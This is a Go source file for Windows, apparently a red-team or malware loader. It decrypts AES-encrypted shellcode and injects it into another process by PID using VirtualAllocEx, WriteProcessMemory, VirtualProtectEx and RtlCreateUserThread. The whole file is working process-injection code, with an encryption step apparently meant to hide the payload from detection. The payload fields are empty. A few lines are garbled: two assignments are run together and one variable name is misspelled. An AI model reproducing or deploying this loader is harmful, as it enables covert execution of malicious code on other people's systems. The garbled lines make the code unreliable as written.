// +build windows

/*
This program executes shellcode in a remote process using the following steps
	1. Get a handle to the target process
	1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
	2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
	3. Change the memory page permissions to Execute/Read with VirtualProtectEx
	4. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread
	5. Close the handle to the remote process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"unsafe"

	// Sub Repositories
	"github.com/Epictetus24/gohideit/enc"
	"golang.org/x/sys/windows"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	// To hardcode the Process Identifier (PID), change 0 to the PID of the target process
	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	var AESencbits enc.AESbits
	AESencbits.Enchex = ""	AESencbits.Salthex = ""
	AAESencbits.Noncehex = ""
	AESencbits.Keystr = ""

	shellcode := enc.AES256Dec(AESencbits)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	CloseHandle := kernel32.NewProc("CloseHandle")

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *pid))
	}
	pHandle, _, errOpenProcess := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(*pid)))

	if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *pid))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *pid))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *pid))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling RtlCreateUserThread on PID %d...", *pid))
	}
	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully called RtlCreateUserThread on PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *pid))
	}
	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
	}

}

// export GOOS=windows GOARCH=amd64;go build -o goRtlCreateUserThread.exe cmd/RtlCreateUserThread/main.go
